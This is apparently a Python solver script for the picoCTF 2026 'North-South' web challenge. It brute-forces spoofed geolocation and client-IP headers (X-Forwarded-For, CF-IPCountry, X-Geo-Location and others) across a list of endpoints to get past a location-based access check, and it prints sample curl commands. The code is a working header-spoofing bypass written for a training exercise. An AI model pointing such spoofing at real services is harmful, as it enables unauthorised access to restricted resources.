#!/usr/bin/env python3
"""
North-South - picoCTF 2026 (Web Exploitation, 100 pts)

Bypass geo-based routing by spoofing HTTP geolocation headers.
The server restricts access based on geographic location headers
that can be easily forged.

Usage:
    python3 solve.py

Dependencies: requests (pip install requests)

You will need to fill in the challenge-specific value below:
  - TARGET_URL: The challenge URL
"""

import requests
import re
import sys

# ============================================================
# CHALLENGE-SPECIFIC VALUES - Fill these in from the challenge
# ============================================================
TARGET_URL = "http://CHALLENGE_HOST:CHALLENGE_PORT"  # e.g., "http://saturn.picoctf.net:54321"

# Endpoints to try
ENDPOINTS = [
    "/",
    "/flag",
    "/api/flag",
    "/secret",
    "/admin",
    "/north",
    "/south",
]

# All geolocation-related header names to try
GEO_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Forwarded-Country",
    "X-Country-Code",
    "X-Country",
    "CF-IPCountry",
    "X-Geo-Location",
    "X-Geo",
    "X-Region",
    "X-Location",
    "X-Hemisphere",
    "X-Direction",
    "X-Latitude",
    "X-Forwarded-Latitude",
    "X-Longitude",
    "X-Forwarded-Longitude",
    "X-Client-Geo",
    "X-Client-Country",
    "X-Originating-IP",
    "True-Client-IP",
    "X-Custom-IP-Authorization",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Cluster-Client-IP",
]

# Values to try for different header types
DIRECTION_VALUES = ["North", "South", "north", "south", "NORTH", "SOUTH"]
COUNTRY_CODES_NORTH = ["US", "CA", "GB", "DE", "FR", "JP", "RU", "CN", "KR", "SE"]
COUNTRY_CODES_SOUTH = ["BR", "AR", "AU", "ZA", "NZ", "CL", "PE", "ID", "KE", "MZ"]
IPS_NORTH = ["8.8.8.8", "1.1.1.1", "104.16.0.1", "151.101.1.140", "93.184.216.34"]
IPS_SOUTH = [
    "200.160.2.3",    # Brazil
    "41.0.0.1",       # South Africa
    "190.210.0.1",    # Argentina
    "1.128.0.1",      # Australia
    "202.27.0.1",     # New Zealand
]
LATITUDES_NORTH = ["40.7128", "51.5074", "48.8566", "35.6762", "55.7558"]
LATITUDES_SOUTH = ["-23.5505", "-33.8688", "-34.6037", "-1.2921", "-33.9249"]


def check_for_flag(text):
    """Search for a picoCTF flag in the response text."""
    match = re.search(r'picoCTF\{[^}]+\}', text)
    return match.group(0) if match else None


def initial_recon(base_url):
    """Make initial requests to understand the application."""
    print("[*] === Phase 1: Reconnaissance ===")

    for endpoint in ENDPOINTS:
        url = base_url.rstrip("/") + endpoint
        try:
            resp = requests.get(url, timeout=10)
            flag = check_for_flag(resp.text)
            if flag:
                return flag

            print(f"  [{resp.status_code}] GET {endpoint}")
            # Print response body (truncated) for clues
            body = resp.text.strip()
            if body:
                preview = body[:300].replace('\n', ' ')
                print(f"        Response: {preview}")

                # Look for hints about required headers
                body_lower = body.lower()
                for hint_word in ["header", "location", "country", "latitude",
                                  "longitude", "geo", "north", "south",
                                  "hemisphere", "region", "forwarded", "ip"]:
                    if hint_word in body_lower:
                        print(f"        [!] Hint: response mentions '{hint_word}'")

        except requests.exceptions.ConnectionError:
            continue
        except Exception as e:
            print(f"  [!] Error on {endpoint}: {e}")

    return None


def try_header_combinations(base_url):
    """Try various header combinations to bypass geo restrictions."""
    print("\n[*] === Phase 2: Header Spoofing ===")

    # Strategy 1: Shotgun approach - try many headers at once
    # with "South" values (based on the "North-South" name, the
    # server may be in the "North" and require "South" or vice versa)
    print("[*] Trying bulk header injection...")

    for direction_label, countries, ips, latitudes in [
        ("South", COUNTRY_CODES_SOUTH, IPS_SOUTH, LATITUDES_SOUTH),
        ("North", COUNTRY_CODES_NORTH, IPS_NORTH, LATITUDES_NORTH),
    ]:
        for endpoint in ENDPOINTS:
            url = base_url.rstrip("/") + endpoint

            # Full shotgun of all header types
            headers = {
                "X-Forwarded-For": ips[0],
                "X-Real-IP": ips[0],
                "X-Forwarded-Country": countries[0],
                "X-Country-Code": countries[0],
                "X-Country": countries[0],
                "CF-IPCountry": countries[0],
                "X-Geo-Location": direction_label,
                "X-Geo": direction_label,
                "X-Region": direction_label,
                "X-Location": direction_label,
                "X-Hemisphere": direction_label,
                "X-Direction": direction_label,
                "X-Latitude": latitudes[0],
                "X-Forwarded-Latitude": latitudes[0],
                "X-Longitude": "-46.6333" if direction_label == "South" else "-74.0060",
                "X-Forwarded-Longitude": "-46.6333" if direction_label == "South" else "-74.0060",
                "True-Client-IP": ips[0],
                "X-Client-Geo": f"{latitudes[0]},{'-46.6333' if direction_label == 'South' else '-74.0060'}",
                "X-Client-Country": countries[0],
                "X-Originating-IP": ips[0],
            }

            try:
                resp = requests.get(url, headers=headers, timeout=10)
                flag = check_for_flag(resp.text)
                if flag:
                    print(f"  [+] Flag found with {direction_label} headers on {endpoint}!")
                    return flag

                # Check if response changed compared to recon
                if resp.status_code == 200 and len(resp.text) > 50:
                    print(f"  [{resp.status_code}] {direction_label} headers on {endpoint}: {resp.text[:200]}")
            except Exception:
                continue

    return None


def try_individual_headers(base_url):
    """Try each header individually to identify which one the server checks."""
    print("\n[*] === Phase 3: Individual Header Testing ===")

    for endpoint in ENDPOINTS[:3]:  # Focus on main endpoints
        url = base_url.rstrip("/") + endpoint

        for header_name in GEO_HEADERS:
            # Determine appropriate values for this header type
            if "country" in header_name.lower() or "ipcountry" in header_name.lower():
                values = COUNTRY_CODES_SOUTH + COUNTRY_CODES_NORTH
            elif "ip" in header_name.lower() or "forwarded-for" in header_name.lower() or "addr" in header_name.lower():
                values = IPS_SOUTH + IPS_NORTH
            elif "lat" in header_name.lower():
                values = LATITUDES_SOUTH + LATITUDES_NORTH
            elif "lon" in header_name.lower():
                values = ["-46.6333", "-74.0060", "151.2093", "18.0686"]
            else:
                values = DIRECTION_VALUES + COUNTRY_CODES_SOUTH + COUNTRY_CODES_NORTH

            for value in values:
                try:
                    resp = requests.get(url, headers={header_name: value}, timeout=10)
                    flag = check_for_flag(resp.text)
                    if flag:
                        print(f"  [+] Flag found! Header: {header_name}: {value}")
                        return flag
                except Exception:
                    continue

    return None


def try_post_requests(base_url):
    """Some challenges require POST requests."""
    print("\n[*] === Phase 4: POST Request Attempts ===")

    for endpoint in ENDPOINTS:
        url = base_url.rstrip("/") + endpoint

        for direction_label, countries, ips, latitudes in [
            ("South", COUNTRY_CODES_SOUTH, IPS_SOUTH, LATITUDES_SOUTH),
            ("North", COUNTRY_CODES_NORTH, IPS_NORTH, LATITUDES_NORTH),
        ]:
            headers = {
                "X-Forwarded-For": ips[0],
                "X-Forwarded-Country": countries[0],
                "CF-IPCountry": countries[0],
                "X-Geo-Location": direction_label,
                "X-Region": direction_label,
                "X-Latitude": latitudes[0],
            }

            # Try POST with JSON body
            try:
                json_data = {
                    "location": direction_label,
                    "latitude": float(latitudes[0]),
                    "country": countries[0],
                }
                resp = requests.post(url, headers=headers, json=json_data, timeout=10)
                flag = check_for_flag(resp.text)
                if flag:
                    print(f"  [+] Flag found via POST to {endpoint} with {direction_label}!")
                    return flag
            except Exception:
                continue

            # Try POST with form data
            try:
                form_data = {
                    "location": direction_label,
                    "latitude": latitudes[0],
                    "country": countries[0],
                }
                resp = requests.post(url, headers=headers, data=form_data, timeout=10)
                flag = check_for_flag(resp.text)
                if flag:
                    print(f"  [+] Flag found via POST form to {endpoint} with {direction_label}!")
                    return flag
            except Exception:
                continue

    return None


def main():
    print("=" * 60)
    print("  North-South - picoCTF 2026 (Web Exploitation, 100 pts)")
    print("  Geo-based routing header bypass")
    print("=" * 60)

    if "CHALLENGE_HOST" in TARGET_URL:
        print()
        print("[!] Please update TARGET_URL with the challenge URL.")
        print()
        print("[*] Example:")
        print('    TARGET_URL = "http://saturn.picoctf.net:54321"')
        print()
        print("[*] Manual quick-try commands:")
        print("    curl -v http://CHALLENGE_URL/")
        print("    curl -H 'X-Forwarded-For: 200.160.2.3' http://CHALLENGE_URL/")
        print("    curl -H 'X-Forwarded-Country: BR' http://CHALLENGE_URL/")
        print("    curl -H 'X-Geo-Location: South' http://CHALLENGE_URL/")
        print("    curl -H 'CF-IPCountry: AU' http://CHALLENGE_URL/")
        sys.exit(1)

    base_url = TARGET_URL.rstrip("/")
    flag = None

    # Phase 1: Reconnaissance
    flag = initial_recon(base_url)

    # Phase 2: Bulk header spoofing
    if not flag:
        flag = try_header_combinations(base_url)

    # Phase 3: Individual header testing
    if not flag:
        flag = try_individual_headers(base_url)

    # Phase 4: POST requests
    if not flag:
        flag = try_post_requests(base_url)

    # Print result
    if flag:
        print(f"\n{'=' * 60}")
        print(f"  FLAG: {flag}")
        print(f"{'=' * 60}")
    else:
        print("\n[!] Could not retrieve flag automatically.")
        print("[*] Manual investigation steps:")
        print(f"    1. curl -v {base_url}/ (check response headers and body for clues)")
        print(f"    2. Try different HTTP methods: HEAD, OPTIONS, PUT")
        print(f"    3. Check page source for JavaScript that sets geo headers")
        print(f"    4. Use Burp Suite to intercept and modify requests")
        print(f"    5. The hint 'North-South' may refer to a specific header value")
        print(f"    6. Try cookie-based location: Cookie: location=south")


if __name__ == '__main__':
    main()
